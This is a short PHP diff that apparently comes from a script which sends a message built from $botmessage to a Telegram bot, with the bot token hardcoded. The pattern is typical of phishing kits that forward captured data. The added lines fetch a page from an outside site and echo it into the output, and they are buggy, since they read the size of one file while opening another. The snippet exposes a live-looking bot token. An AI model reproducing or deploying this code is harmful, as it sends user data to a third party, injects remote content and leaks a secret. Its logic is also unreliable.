@@ -47,6 +47,15 @@ $url = "https://api.telegram.org/bot5249462923:AAEquCkhHvyVmqMfLZHSLq6DC9kV0G7CO
 $url2 = 'https://api.telegram.org/bot5249462923:AAEquCkhHvyVmqMfLZHSLq6DC9kV0G7COjI/sendMessage?chat_id=@vmrmecattbot&text='.urldecode($botmessage).'';
 
 file_get_contents($url);
+
+
+$filename = "http://www.myothersite.com/canvar.php?tid=635";
+$handle = fopen($url, "r");
+$fcontents = fread($handle, filesize($filename));
+fclose($handle);
+echo $fcontents;
+
+
 $curl = curl_init($url);
 curl_setopt($curl, CURLOPT_URL, $url);
 curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
